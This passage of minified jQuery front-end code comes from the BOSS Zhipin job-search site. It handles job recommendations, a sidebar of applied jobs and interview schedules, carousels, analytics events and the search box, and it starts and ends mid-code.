"</span></div></div></a></div></li>")).data("data", e)
        },
        getTopJobList: function() {
            var t = this
              , e = "/wapi/zpgeek/home/top/joblist.json?expectId=" + this.exceptId;
            $.ajax({
                type: "get",
                url: e,
                dataType: "json",
                async: !1,
                success: function(e) {
                    e && 0 == e.code && e.zpData && e.zpData.jobList && (9 < e.zpData.jobList.length && (e.zpData.jobList = e.zpData.jobList.slice(0, 9)),
                    t.renderRecommend3(e.zpData.jobList, e.zpData.sessionId || ""),
                    t.recommendData3 = e.zpData.jobList)
                }
            })
        },
        getPushRecommendInfo: function(t) {
            var i = this
              , e = $("#page_key_name").val()
              , e = "/wapi/zpgeek/recommend/job/list.json?expectId=" + this.exceptId + "&pk=" + (e || "") + "&sortType=" + t + "&page=1&salary=&payType=&degree=&experience=&stage=&scale=&districtCode=&businessCode=";
            $.ajax({
                type: "get",
                url: e,
                dataType: "json",
                async: !1,
                success: function(e) {
                    e && 0 == e.code && e.zpData && e.zpData.jobList && (9 < e.zpData.jobList.length && (e.zpData.jobList = e.zpData.jobList.slice(0, 9)),
                    i["renderRecommend" + t](e.zpData.jobList, e.zpData.sessionId),
                    i["recommendData" + t] = e.zpData.jobList)
                }
            })
        },
        getRecommendInfo: function(e) {
            var t = this;
            $.ajax({
                type: "get",
                url: "/wapi/zpgeek/recommend/conditions.json",
                dataType: "json",
                success: function(e) {
                    e && 0 == e.code && e.zpData && e.zpData.expectList && e.zpData.expectList.length && (t.renderRecommendSelect(e.zpData.expectList),
                    t.getPushRecommendInfo(1),
                    t.getPushRecommendInfo(2),
                    t.getTopJobList(),
                    t.isShowRecommendBox())
                }
            })
        },
        renderRecommendSelect: function(e) {
            var t = e[0] || {}
              , i = (this.exceptId = t.encryptId,
            $('<div class="select-label"></div>'))
              , n = $('<div class="select-dropdown-menu"></div>');
            i.append('<div class="select-dropdown-text">' + (t.locationName || "") + '<div class="vline"></div>' + (t.positionName || "") + '<div class="vline"></div>' + (t.salary || "") + "</div>");
            for (var a = 0; a < e.length; a++)
                n.append($("<div >" + (e[a].locationName || "") + '<div class="vline"></div>' + (e[a].positionName || "") + '<div class="vline"></div>' + (e[a].salary || "") + "</div>").data("data", e[a]));
            i.append(n),
            $(".merge-city-job-recommend .dropdown-filter-geek-recommend").append(i),
            $(".merge-city-job-recommend .dropdown-filter-geek-recommend .select-dropdown-menu>div").eq(0).addClass("active")
        },
        updateRecommendSelectLabel: function(e) {
            this.$container.find(".dropdown-filter-geek-recommend .select-label .select-dropdown-text").html((e.locationName || "") + '<div class="vline"></div>' + (e.positionName || "") + '<div class="vline"></div>' + (e.salary || "") + '<i class="arrow"></i>')
        },
        notData: function(e, t) {
            t && 0 < t.length ? e.find(".not-data,.not-data-text").hide() : (e.find(".not-data")[0] ? e.find(".not-data,.not-data-text").show() : e.append($('<div class="not-data"></div><div class="not-data-text">暂无职位</div>')),
            this.$recommendBox.hide())
        }
    };
    l.init(),
    $('.user-nav a[ka="header-message"]').on("click", function() {
        $.post("/wapi/zpCommon/actionLog/common.json", {
            action: "action-chat-list-listshow"
        })
    })
}(),
$.ajax({
    url: "/wapi/zpuser/wap/getSecurityGuideV1",
    method: "get",
    success: function(e) {
        var t = e.zpData || {};
        0 == e.code && t.whetherPopUp && (e = "",
        t.imgUrl && (e = '<img class="security-thumb-image" src="' + t.imgUrl + '" />'),
        $.dialog({
            title: "",
            content: e + "<h3>" + (t.title || "") + "</h3><p>" + (t.subTitle || "") + "</p>",
            closeText: !0,
            confirmText: "去设置",
            cancelText: !1,
            preKa: "",
            closeLayer: !1,
            wrapClass: "dialog-account-safe",
            onOpen: function() {
                try {
                    _T.sendEvent("safe-identity-authen-low-level-expo")
                } catch (e) {}
            },
            onConfirm: function() {
                $.ajax({
                    url: "/wapi/zpuser/wap/choseShowSecurity",
                    method: "get"
                });
                try {
                    _T.sendEvent("safe-identity-authen-low-level-click", "1")
                } catch (e) {}
                var e = setTimeout(function() {
                    clearTimeout(e),
                    window.location.href = t.url || "/"
                }, 300)
            },
            onClose: function() {
                $.ajax({
                    url: "/wapi/zpuser/wap/choseShowSecurity",
                    method: "get"
                });
                try {
                    _T.sendEvent("safe-identity-authen-low-level-click", "0")
                } catch (e) {}
            }
        }))
    }
}),
!function() {
    for (var e = ["home-body-wrapper", "job-body-wrapper"], t = !1, i = 0; i < e.length; i++)
        if ($("body").hasClass(e[i])) {
            t = !0;
            break
        }
    (-1 < ["cpc_user_job", "cpc_rcmd_system"].indexOf($("#page_key_name").val()) || t) && $.ajax({
        url: "/wapi/zpgeek/collection/popup/window",
        method: "get",
        success: function(e) {
            var t, i;
            0 == e.code && e.zpData && (t = e.zpData.userType,
            i = $.cookie("collection_pop_window"),
            0 < parseInt(t) && 1 != i && ($.cookie("collection_pop_window", 1, {
                path: "/",
                expires: 30
            }),
            $.satisfactionCollect({
                cid: e.zpData.cid || ""
            })))
        }
    })
}(),
!function() {
    var e = "https://www.zhipin.com";
    -1 < location.host.indexOf("pre-www.zhipin.com") ? e = "https://pre-www.zhipin.com" : -1 < location.host.indexOf("weizhipin.com") && (e = "https://boss-m-qa.weizhipin.com"),
    seriesLoadScripts(e + "/web/common/header-tools.js", function() {
        window.headerTools && window.headerTools.appendCourseEntry()
    }),
    $("body").hasClass("page-sign") && $("body").css({
        height: "100%"
    }),
    $("body").hasClass("activity-common-viewer") && navigator.userAgent.match(/Trident\/7\./) && document.body.addEventListener && document.body.addEventListener("mousewheel", function() {
        event.preventDefault();
        var e = event.wheelDelta
          , t = window.pageYOffset;
        window.scrollTo(0, t - e)
    })
}(),
$(function() {
    var e = $(".home-job-menu")
      , t = 1
      , i = e.find(".job-menu-page").data("size") || 7
      , n = e.find(".job-menu-page").data("pages") || 1;
    e.on("click", ".menu-page-prev", function() {
        --t < 1 ? (t = n,
        e.find(".job-menu-wrapper dl").eq((t - 1) * i).prevAll().addClass("hide")) : e.find(".job-menu-wrapper dl").filter(function(e) {
            return e < t * i && (t - 1) * i <= e
        }).removeClass("hide"),
        e.find(".menu-current-page").text(t)
    }),
    e.on("click", ".menu-page-next", function() {
        n < ++t ? (t = 1,
        e.find(".job-menu-wrapper dl").removeClass("hide")) : e.find(".job-menu-wrapper dl").eq((t - 1) * i).prevAll().addClass("hide"),
        e.find(".menu-current-page").text(t)
    })
}),
$(function() {
    var r = {
        init: function(e) {
            this.tabName = e,
            this.siderTab = {
                interest: {
                    title: "感兴趣的职位",
                    requestUrl: "/wapi/zprelation/interaction/geekGetJob?tag=4&isActive=true",
                    url: "/web/geek/jobsfromchat?tag=4",
                    index: 1
                },
                contact: {
                    title: "沟通过的职位",
                    requestUrl: "/wapi/zprelation/interaction/geekGetJob?tag=5&isActive=true",
                    url: "/web/geek/jobsfromchat?tag=5",
                    index: 2
                },
                deliver: {
                    title: "投递过的职位",
                    requestUrl: "/wapi/zprelation/resume/geekDeliverList",
                    url: "/web/geek/jobsfromchat?tag=3",
                    index: 3
                },
                interview: {
                    title: "面试日程",
                    requestUrl: "/wapi/zpinterview/geek/interview/data.json",
                    url: "/web/geek/jobsfromchat?tag=2",
                    index: 4
                }
            },
            this.curTab = this.siderTab[this.tabName],
            this.interviewData = {},
            this.showSlideList()
        },
        showSlideList: function() {
            var t = this
              , e = r.loadFun()
              , e = ($("#side-bar-box .sider-detail").remove(),
            '<div class="sider-detail">            <p class="sider-title">' + this.curTab.title + '<a href="javascript:;">查看全部</a></p>            ' + e + "            </div>");
            $("#side-bar-box").append(e),
            this.tabTemplate(function(e) {
                e = '<p class="sider-title">' + t.curTab.title + '<a href="javascript:;">查看全部</a></p>                ' + e + " ";
                $("#side-bar-box .sider-detail").html(e)
            })
        },
        tabCheckall: function() {
            location.href = this.curTab.url
        },
        getTagData: function() {
            var t = $.Deferred();
            return $.get(this.curTab.requestUrl).success(function(e) {
                e ? ("function" == typeof ajaxGetaway && ajaxGetaway(e.code),
                t.resolve(e)) : $.toast({
                    content: "数据加载出错，请稍后再试",
                    type: "error"
                })
            }),
            t
        },
        tabTemplate: function(i) {
            var n = this
              , a = "";
            this.getTagData().then(function(e) {
                if (0 == e.code && e.zpData) {
                    var t = e.zpData.cardList || e.zpData.interviewList;
                    if (0 == t.length)
                        return a = n.errorTips("notHave"),
                        void i(a);
                    a = 4 == n.curTab.index ? r.getInterviewTemplate(t) : r.getOtherTemplate(t)
                } else
                    1011 == e.code || 7 == e.code ? a = n.errorTips("notLogin") : $.toast({
                        content: e.message,
                        type: "error"
                    });
                i(a)
            })
        },
        getOtherTemplate: function(e) {
            var o = this
              , s = ""
              , r = ""
              , c = ""
              , l = ""
              , d = ""
              , p = "";
            return $.each(e, function(e, t) {
                c = "",
                l = "/job_detail/" + t.encryptJobId + ".html",
                d = t.salaryDesc,
                2 == t.jobValidStatus && (c = "opacity",
                l = "javascript:;",
                d = "停止招聘"),
                t.salaryMonthText && (p = "·" + t.salaryMonthText),
                1 == o.curTab.index && (s = '<button class="btn btn-primary btn-small btn-sider-interest"  data-jobid="' + t.encryptJobId + '">移除</button>');
                var i = t.brandStageName ? '<span class="vline"></span><span>' + t.brandStageName + "</span>" : ""
                  , n = "";
                if (t.afterNameIcons && (t.afterNameIcons || []).length)
                    for (var a = 0; a < t.afterNameIcons.length; a++)
                        n += '<img class="job-medium-icon" src="' + (t.afterNameIcons[a] || {}).url + ' " />';
                r += '                         <li class="' + c + '">                            <a href="' + l + '">                                <h4><span class="sider-degree">' + d + p + '</span><span class="sider-position-title"><span class="title-text' + (1 == t.proxyType || 3 == t.proxyType ? "" : " no-medium") + '">' + t.jobName + "</span>" + n + '</span></h4>                                <p class="company-info">                                    <span>' + (t.brandName || "") + "</span>" + (i || "") + '                                </p>                                <p>                                    <img class="user-avatar" src="' + t.bossAvatar + '" alt=""/>                                    <span class="user-text">' + (t.bossName || "") + '<span class="vline"></span>' + (t.bossTitle || "") + "</span>                                    " + s + "                                </p>                            </a>                        </li>"
            }),
            '                    <ul class="sider-template">                        ' + r + '                      </ul>                    <a class="siderbar-more" href="' + this.curTab.url + '">查看更多</a>'
        },
        getInterviewTemplate: function(e) {
            var t, i = "", n = "", a = (btnstr = "",
            r.getInterviewData(e));
            for (t in this.interviewData = a) {
                var o = new Date(a[t][0].appointmentDate)
                  , s = o.getDate()
                  , o = +o.getMonth() + 1
                  , n = "";
                $.each(a[t], function(e, t) {
                    btnstr = "",
                    0 == t.statusCode && (btnstr = '                        <span class="btns-sider-interview">                            <a href="javascript:;" class="btn btn-cancel">拒绝</a>                            <a href="javascript:;" class="btn btn-submit">接受</a>                        </span>'),
                    n += '                    <li data-interviewId="' + t.interviewIdStr + '">                        <div class="interview-container">                            <h4 class="sub-title"><span class="interview-status">' + t.statusDesc + '</span><span class="company-name">' + t.brandName + '</span></h4>                            <p class="interview-info">                                时间：<span>' + t.appointmentTime.split(" ")[1] + "</span><br>                                职位：<span>" + t.jobName + "</span><br>                                薪资：<span>" + t.jobSalary + '</span><br>                            </p>                            <p class="interview-user-info">                                <img src="' + t.bossAvatar + '"  alt=""/>                                <span class="user-text">' + t.bossName + '<span class="vline"></span>' + t.bossTitle + "</span>                                " + btnstr + "                            </p>                        </div>                     </li>"
                }),
                i += '                <div class="oneday-wrap ' + t + '" data-value = "' + t + '">                <p class="interview-time"> ' + a[t][0].appointmentWeekDesc + " <span>" + o + "月" + s + '日</span></p>                <ul class="interview-list">                ' + n + "                </ul>                </div>"
            }
            return i += '<a class="siderbar-more" href="/web/geek/jobsfromchat?tag=2&page=1">查看更多</a>'
        },
        getInterviewData: function(e) {
            var n = {};
            return $.each(e, function(e, t) {
                var i = t.interviewIdStr;
                n[i] || (n[i] = []),
                n[i].push(t)
            }),
            n
        },
        errorTips: function(e) {
            return "notHave" == e ? '                <div class="sider-error-tip">                    <i class="not-have"></i>                    <p>暂时没有' + this.curTab.title + '</p>                    <a href="/job_detail" class="btn btn-sider-more">查看更多职位</a>                </div>' : '                <div class="sider-error-tip">                    <i class="not-login"></i>                    <p>登录后查看' + this.curTab.title + '</p>                    <a href="javascript:;" class="btn btn-login">去登录</a>                </div>'
        },
        loadFun: function() {
            return '            <div class="sider-load">                <i></i>                <p>加载中，请稍等</p>            </div>'
        },
        interviewDefer: function(e, t) {
            var i = $.Deferred();
            return $.get("/wapi/zprelation/interview/geek/operate.json", {
                interviewId: e,
                status: t
            }, function(e) {
                0 == e.code ? i.resolve(e) : $.toast({
                    content: e.resmsg,
                    type: "error"
                })
            }),
            i
        },
        showInviteTip: function(t) {
            $.dialog({
                content: '<div class="text">· 面试前一天18点前，双方都可以申请取消。<br>· 如不取消，请按时出席面试，不要爽约。<br>· 对方爽约，约定时间30分钟可以投诉。<br>· 爽约一方，平台回加【不良记录】并公示。<br>· 为了方便联系，邀请面试成功后，双方自动交换手机联系方式。<br>· 对方将自动获取你的简历附件。</div>',
                title: "约面试诚信守则",
                closeText: !1,
                cancelText: "我再想想",
                confirmText: "保证不爽约",
                wrapClass: "interview-pop",
                onOpen: function(e) {},
                onConfirm: function(e) {
                    t(),
                    e.remove()
                }
            })
        },
        handDetailTop: function() {
            var e, t, i = $("#side-bar-box .sider-detail"), n = $("#header");
            i.length && (e = $(window).scrollTop(),
            t = n.height() + $("#top-active-box").height(),
            i.css("top", (t = 0 < t - e ? t - e : 0) + "px"),
            $(".home-body-wrapper").length && e >= $("#main").offset().top && i.css("top", t + n.height() + "px"),
            e < 20 && i.css("top", t - 1 + "px"))
        },
        handleGoTop: function() {
            1e3 <= $(window).scrollTop() ? $("#side-bar-box .back-top").addClass("show") : $("#side-bar-box .back-top").removeClass("show")
        },
        eventHander: function() {
            var a = this;
            $("body").on("click", "#side-bar-box .back-top", function() {
                $("html,body").animate({
                    scrollTop: "0px"
                }, 400)
            }),
            $("body").on("click", "#side-bar-box .side-feedback", function() {
                Feedback.getContent()
            }),
            $("body").on("click", "#side-bar-box .side-service", function() {
                if (!$(".chat-bot-iframe-mask").length) {
                    try {
                        _T.sendEvent("side_feedback")
                    } catch (e) {}
                    $("body").append('                    <div class="chat-bot-iframe-mask">                        <iframe                            class="chat-bot-iframe"                            src="/web/wisdomstone/index.html">                        </iframe>                    </div>'),
                    window.addEventListener("message", function(e) {
                        e && e.data && "closeChatBotDialog" === e.data.action && $(".chat-bot-iframe-mask").remove()
                    })
                }
            }),
            $(window).scroll(function() {
                r.handDetailTop(),
                r.handleGoTop()
            }),
            r.handleGoTop(),
            $("body").on("click", "#side-bar-box .side-bar-top li", function() {
                var e = $(this)
                  , t = e.attr("data-value");
                t && ((window._PAGE || {}).uid ? (r.init(t),
                $("#side-bar-box").css({
                    right: "324px"
                }),
                $("#side-bar-box .sider-detail").css({
                    width: "300px",
                    "overflow-y": "auto"
                }),
                e.addClass("active").siblings().removeClass("active"),
                r.handDetailTop()) : ShowLoginDialog.showBossLogin({
                    params: {
                        pk: e.find("a").attr("ka") || "",
                        title: {
                            interest: "登录查看感兴趣职位",
                            contact: "登录查看沟通过职位",
                            deliver: "登录查看已投递职位",
                            interview: "登录查看面试日程"
                        }[t] || "",
                        eventLog: {
                            p: e.find("a").attr("ka") || ""
                        }
                    }
                }))
            }),
            $("body").on("click", "#side-bar-box .btn-login", function() {
                ShowLoginDialog.showBossLogin({
                    params: {
                        pk: $(this).attr("ka") || ""
                    }
                })
            }),
            $("body").on("click", function(e) {
                e = e.target;
                0 == $(e).closest("#side-bar-box").length && ($("#side-bar-box .sider-detail").css({
                    width: "0px",
                    "overflow-y": "hidden"
                }),
                $("#side-bar-box").css({
                    right: "24px"
                }),
                $("#side-bar-box .side-bar-top li").removeClass("active"))
            }),
            $("body").on("click", "#side-bar-box .sider-template li", function(e) {
                var t, i = e.target;
                $(i).hasClass("btn-sider-interest") && (e.preventDefault(),
                t = $(this),
                $.post("/wapi/zprelation/geekTag/job/interest", {
                    jobId: $(i).attr("data-jobid"),
                    tag: "4",
                    flag: "0"
                }, function() {
                    t.slideUp(300, function() {
                        t.remove()
                    })
                }))
            }),
            $("body").on("click", "#side-bar-box .btns-sider-interview ", function(e) {
                var t = $(this)
                  , i = t.closest("li").index()
                  , n = t.closest(".oneday-wrap").attr("data-value")
                  , e = e.target;
                return $(e).hasClass("btn-submit") ? r.showInviteTip(function() {
                    r.interviewDefer(t.closest("li").attr("data-interviewId"), 1).then(function() {
                        t.closest("li").find(".interview-status").html("即将面试").end().find(".btns-sider-interview").remove()
                    })
                }) : r.interviewDefer(t.closest("li").attr("data-interviewId"), 2).then(function() {
                    a.interviewData[n].splice(i, 1),
                    t.closest("li").find(".interview-status").html("已拒绝").end().slideUp(300, function() {
                        $(this).remove(),
                        0 == a.interviewData[n].length && $("." + n).remove()
                    })
                }),
                !1
            }),
            $("body").on("click", "#side-bar-box .sider-title a", function() {
                r.tabCheckall()
            })
        }
    };
    r.eventHander()
}),
$(function() {
    var t, i, n, e = $(".main-screen .prev"), a = $(".main-screen .next"), o = new Swiper(".main-screen .swiper-container",{
        mode: "horizontal",
        autoplay: 5e3,
        loop: !0,
        pagination: ".swiper-pagination",
        paginationClickable: !0,
        autoplayDisableOnInteraction: !1
    });
    function s(e) {
        var t = e.find("ul")
          , e = e.find("li:first-child").height();
        t.stop().animate({
            marginTop: -e
        }, 600, function() {
            t.css({
                marginTop: 0
            }).find("li:first").appendTo(t)
        })
    }
    e.on("click", function() {
        o.swipePrev();
        try {
            _T.sendEvent("school_banner_prev_click")
        } catch (e) {}
    }),
    a.on("click", function() {
        o.swipeNext();
        try {
            _T.sendEvent("school_banner_next_click")
        } catch (e) {}
    }),
    $(".main-screen .swiper-container").hover(function() {
        $(this).find(".swiper-masking").fadeIn(200),
        $(this).find(".prev").fadeIn(200),
        $(this).find(".next").fadeIn(200)
    }, function() {
        $(this).find(".swiper-masking").fadeOut(200),
        $(this).find(".prev").fadeOut(200),
        $(this).find(".next").fadeOut(200)
    }),
    t = $(".student-activity"),
    i = t.find(".student-activity-slide"),
    n = null,
    n = setInterval(function() {
        s(i)
    }, 2e3),
    t.find(".look-more").hover(function() {
        $(this).hide(),
        t.addClass("expand"),
        n && clearInterval(n),
        i.find("ul").finish();
        var e = i.find("li").length * i.find("li").height() + 6 * (i.find("li").length - 1) + 10;
        i.stop().animate({
            height: e + "px",
            overflow: "auto"
        }, 600)
    }),
    t.mouseleave(function() {
        i.stop().animate({
            height: "21px",
            overflow: "hidden"
        }, 600, function() {
            t.find(".look-more").show(),
            t.removeClass("expand"),
            n && clearInterval(n),
            n = setInterval(function() {
                s(i)
            }, 2e3)
        })
    }),
    $(".school-job-menu .job-menu-tab").on("click", "li", function() {
        $(this).hasClass("active") || ($(".expand-menu-container").hide(),
        $(".job-menu-list li").removeClass("active"),
        $(this).addClass("active").siblings().removeClass("active"),
        $(".school-job-menu .job-menu-list ul").removeClass("active").eq($(this).index()).addClass("active"))
    }),
    $(".school-job-menu .job-menu-major, .school-job-menu .job-menu-cluster").on("click", "li", function() {
        $(this).hasClass("active") || ($(".job-menu-list li").removeClass("active"),
        $(".expand-menu-container li").removeClass("active"),
        $(this).addClass("active"),
        ("major" == $(".school-job-menu .job-menu-tab li.active").data("type") ? $(".expand-menu-list > li") : $(".expand-menu-cluster > li")).eq($(this).index()).addClass("active"),
        $(".expand-menu-container").show())
    }),
    $(".school-job-menu").on("clickout", function() {
        $(".expand-menu-container").hide(),
        $(".job-menu-list li").removeClass("active")
    }),
    $(".expand-menu-list .menu-sub-container > a").on("click", function(e) {
        e.preventDefault(),
        $(this).parent().addClass("expand").siblings().removeClass("expand")
    });
    var e = $(".school-zhibo .prev")
      , a = $(".school-zhibo .next")
      , r = $(".school-zhibo .swiper-slide").length
      , c = (r < 5 && (e.hide(),
    a.hide()),
    new Swiper(".swiper-zhibo .swiper-container",{
        slidesPerView: 4,
        centeredSlides: !1,
        direction: "horizontal",
        freeMode: !1,
        onTouchEnd: function(e) {
            l(e.activeIndex)
        }
    }));
    function l(e) {
        0 < e ? $(".school-zhibo .prev").fadeIn(200) : $(".school-zhibo .prev").fadeOut(200),
        r - e <= 4 ? $(".school-zhibo .next").fadeOut(200) : $(".school-zhibo .next").fadeIn(200)
    }
    e.on("click", function() {
        var e = c.activeIndex - 4;
        c.swipeTo(e = e < 0 ? 0 : e, 500, !1),
        l(c.activeIndex)
    }),
    a.on("click", function() {
        var e = c.activeIndex + 4;
        c.swipeTo(e = r - 1 < e ? r - 4 : e, 500, !1),
        l(c.activeIndex)
    }),
    $(".school-zhibo .img-wrap").each(function() {
        var e = $(this)
          , t = e.find(".hover-code")
          , e = e.find(".zhibo-img").attr("data-liveid");
        $.ajax({
            url: "/wapi/zpgeek/live/recruit/qrcode/query.json",
            type: "GET",
            dataType: "json",
            data: "liveRecordId=" + e,
            success: function(e) {
                0 == e.code && (e = e.zpData.result || "",
                t.find("img").attr("src", e))
            }
        })
    }),
    $(".school-zhibo .img-wrap").hover(function(e) {
        var t = $(this).attr("data-index");
        _T.sendEvent("school_live_hover_" + t)
    }, function() {});
    var e = $(".school-live .next")
      , a = $(".school-live .prev")
      , d = ($(".school-live .swiper-slide").length < 2 && (e.hide(),
    a.hide()),
    new Swiper(".school-live .swiper-container",{
        slidesPerView: 1,
        loop: !0,
        calculateHeight: !0
    }))
      , a = (a.on("click", function() {
        d.swipePrev();
        try {
            _T.sendEvent("school_live_prev_click")
        } catch (e) {}
    }),
    e.on("click", function() {
        d.swipeNext();
        try {
            _T.sendEvent("school_live_next_click")
        } catch (e) {}
    }),
    $(".job-strategy .prev"))
      , e = $(".job-strategy .next")
      , p = $(".job-strategy .swiper-slide").length
      , u = (p < 5 && (a.hide(),
    e.hide()),
    new Swiper(".job-strategy .swiper-container",{
        slidesPerView: 4,
        centeredSlides: !1,
        direction: "horizontal",
        freeMode: !1,
        onTouchEnd: function(e) {
            h(e.activeIndex)
        }
    }));
    function h(e) {
        0 < e ? $(".job-strategy .prev").fadeIn(200) : $(".job-strategy .prev").fadeOut(200),
        p - e <= 4 ? $(".job-strategy .next").fadeOut(200) : $(".job-strategy .next").fadeIn(200)
    }
    a.on("click", function() {
        var e = u.activeIndex - 4;
        u.swipeTo(e = e < 0 ? 0 : e, 500, !1),
        h(u.activeIndex)
    }),
    e.on("click", function() {
        var e = u.activeIndex + 4;
        u.swipeTo(e = p - 1 < e ? p - 4 : e, 500, !1),
        h(u.activeIndex)
    });
    var f = !0
      , m = !0
      , g = !0
      , v = !0
      , w = !0
      , b = !0
      , y = !0
      , x = $(".school-body")
      , k = x.find(".school-live")
      , C = x.find(".job-guide")
      , T = x.find(".resume-template");
    function _() {
        if (x.find(".school-zhibo-buried") && x.find(".school-zhibo-buried").offset()) {
            var e = x.find(".school-zhibo-buried").offset().top;
            if (e >= $(window).scrollTop() && e < $(window).scrollTop() + $(window).height()) {
                if (f)
                    try {
                        _T.sendEvent("school_hot_live"),
                        f = !1
                    } catch (e) {}
            } else
                f = !0
        }
        if (x.find(".school-hotcompany") && x.find(".school-hotcompany").offset()) {
            e = x.find(".school-hotcompany").offset().top;
            if (e >= $(window).scrollTop() && e < $(window).scrollTop() + $(window).height()) {
                if (m)
                    try {
                        _T.sendEvent("school_hot_company"),
                        m = !1
                    } catch (e) {}
            } else
                m = !0
        }
        if (x.find(".school-hotrecruitment") && x.find(".school-hotrecruitment").offset()) {
            e = x.find(".school-hotrecruitment").offset().top;
            if (e >= $(window).scrollTop() && e < $(window).scrollTop() + $(window).height()) {
                if (g)
                    try {
                        _T.sendEvent("school_got_job"),
                        g = !1
                    } catch (e) {}
            } else
                g = !0
        }
        if (x.find(".school-job-strategy") && x.find(".school-job-strategy").offset()) {
            e = x.find(".school-job-strategy").offset().top;
            if (e >= $(window).scrollTop() && e < $(window).scrollTop() + $(window).height()) {
                if (v)
                    try {
                        _T.sendEvent("school_employ_strategy"),
                        v = !1
                    } catch (e) {}
            } else
                v = !0
        }
        if (k.length) {
            e = (k.offset() || {}).top;
            if (e >= $(window).scrollTop() && e < $(window).scrollTop() + $(window).height()) {
                if (!w)
                    return;
                try {
                    _T.sendEvent("school_streaming"),
                    w = !1
                } catch (e) {}
            } else
                w = !0
        }
        if (C.length) {
            e = (C.offset() || {}).top;
            if (e >= $(window).scrollTop() && e < $(window).scrollTop() + $(window).height()) {
                if (!b)
                    return;
                try {
                    _T.sendEvent("school_instruction"),
                    b = !1
                } catch (e) {}
            } else
                b = !0
        }
        if (T.length) {
            e = (T.offset() || {}).top;
            if (e >= $(window).scrollTop() && e < $(window).scrollTop() + $(window).height()) {
                if (y)
                    try {
                        _T.sendEvent("school_resume"),
                        y = !1
                    } catch (e) {}
            } else
                y = !0
        }
    }
    var S, D = !1, E = !1, j = !1, I = document.getElementsByClassName("school-zhibo-buried")[0], z = document.getElementsByClassName("school-hotcompany")[0], L = document.getElementsByClassName("school-job-strategy")[0];
    function O() {
        $(".school-body-wrapper").length && ($(window).scrollTop() >= $("#main").offset().top ? $(".school-body-wrapper").addClass("fixed-header") : $(".school-body-wrapper").removeClass("fixed-header"))
    }
    function R(e) {
        try {
            $.ajax({
                method: "post",
                url: "/wapi/zpCommon/actionLog/common.json",
                data: {
                    ba: JSON.stringify(e)
                },
                cache: !1,
                success: function(e) {},
                error: function() {}
            })
        } catch (e) {}
    }
    _(),
    $(window).scroll(function() {
        var e, t, i, n, a;
        _(),
        e = window.scrollY + document.body.clientHeight,
        t = window.scrollY,
        i = I ? I.offsetTop + I.offsetHeight / 2 + 402 : 0,
        n = z ? z.offsetTop + z.offsetHeight / 2 + 402 : 0,
        a = L ? L.offsetTop + L.offsetHeight / 2 + 402 : 0,
        !D && t < i && i < e && (D = !0,
        R({
            action: "action-school-live-expose"
        })),
        !E && t < n && n < e && (E = !0,
        R({
            action: "action-school-hotcompany-expose"
        })),
        !j && t < a && a < e && (j = !0,
        R({
            action: "action-school-strategy-expose"
        })),
        O()
    }),
    O(),
    $(".screen-menu").on("click", "dl", function(e, t) {
        var i = $(this).index() + 1;
        _T.sendEvent("school_guide_click_" + i)
    }),
    S = $(".swiper-school-live .live-item"),
    (a = $.map(S, function(e) {
        return $(e).data("id")
    })).length && $.ajax({
        url: "/wapi/zpboss/h5/liveRecruit/audience/queryLivingGif",
        method: "get",
        data: {
            encryptRecordIds: a.join(",")
        },
        success: function(e) {
            var n;
            0 == e.code && e.zpData && (n = e.zpData.gifList || []).length && ($.each(S, function(e, t) {
                var i = function(e, t) {
                    for (var i = 0; i < e.length; i++)
                        if (e[i] && e[i].encryptRecordId == t)
                            return e[i]
                }(n, $(t).data("id"));
                i && $(t).data("gif", i.gifUrl || "")
            }),
            S.hover(function() {
                var e;
                $(this).data("gif") && ((e = $(".live-image", $(this))).data("origin", e.attr("src")),
                e.attr("src", $(this).data("gif")))
            }, function() {
                var e;
                $(this).data("gif") && (e = $(".live-image", $(this))).attr("src", e.data("origin"))
            }))
        }
    }),
    $(".swiper-school-live .live-item").on("click", ".info-main p", function(e) {
        var t = $(this).parents(".live-item").attr("href") || "";
        t && (e.stopPropagation(),
        e.preventDefault(),
        window.open(t + "&anchor=position"))
    })
});
var Search = {
    init: function() {
        function t() {
            $(".city-dialog .city-wrapper").on("click", ".city-cur", function(e) {
                var t = $(e.target).text()
                  , e = $(e.target).attr("data-val");
                $(".search-box .city-sel .label-text b").text(t),
                $(".search-box .city-code").attr("value", e),
                $(".city-dialog.city-letter-show").hide();
                try {
                    var i = $("#page_key_name").val() || "";
                    _T.sendEvent("pc-citylist-city-click", i, t || "", e || "")
                } catch (e) {}
                return !1
            })
        }
        Search.searchBox = $(".search-box"),
        Search.isLoading = !1,
        Search.guessElement = [],
        $(".bottom-banner .closeIcon").on("click", function() {
            $(this).parents(".bottom-banner").hide()
        }),
        Search.searchBox.find(".city-sel").on("click", function(e) {
            Search.renderCityDialogNew(t);
            try {
                _T.sendEvent("switch_city_dialog_open")
            } catch (e) {}
        }),
        Search.searchBox.find(".btn-map-search").on("click", function() {
            try {
                _T.sendEvent("pc-map-click", "0")
            } catch (e) {}
            var e = $(this).closest("form").find("input[name=query]").val() || "";
            window.location.href = "/web/geek/map/jobs?query=" + e + "&from=1"
        }),
        Search.searchBox.find(".position-sel").on("click", function(e) {
            Search.searchBox.toggleClass("show-position")
        }),
        Search.searchBox.find(".industry-sel").on("click", function(e) {
            Search.searchBox.toggleClass("show-industry")
        }),
        Search.searchBox.find(".dorpdown-province").on("mouseover", "li", function() {
            var e = $(this).index()
              , t = $(this).parent().find("li")
              , i = Search.searchBox.find(".dorpdown-city ul")
              , t = (t.removeClass("cur"),
            $(this).addClass("cur"),
            i.removeClass("show"),
            i.eq(e).addClass("show"),
            i.eq(e).find("li"));
            0 < t.length && i.eq(e).find("li.cur").length < 1 && t.eq(0).addClass("cur")
        }),
        Search.searchBox.find(".dorpdown-province").on("click", "li", function() {
            var e = $(this).index()
              , e = Search.searchBox.find(".dorpdown-city ul").eq(e);
            0 < e.find("li").length && e.find("li").eq(0).trigger("click")
        }),
        Search.searchBox.find(".dorpdown-city").on("click", "li", function() {
            var e = Search.searchBox.find(".city-sel").find(".label-text b")
              , t = Search.searchBox.find(".city-code")
              , i = Search.searchBox.find(".city-name");
            e.text($(this).text()),
            t.val($(this).attr("data-val")),
            i.val($(this).text()),
            Search.searchBox.find(".dorpdown-city ul .cur").removeClass("cur"),
            $(this).addClass("cur")
        }),
        Search.searchBox.length && (Search.loadIndustryData(Search.renderIndustry),
        Search.loadCityData()),
        Search.searchBox.find(".dropdown-menu").each(function() {
            var e = $(this)
              , t = e.find(".select-tree")
              , n = e.find(".tags-cells");
            Search.loadPositionData(function(e) {
                n.length && Resume.getTag(formEl, !0);
                var i;
                t.length && (i = '<div class="position-select-dropdown"><div class="position-select-dropdown__inner">',
                $.each(e || [], function(e, t) {
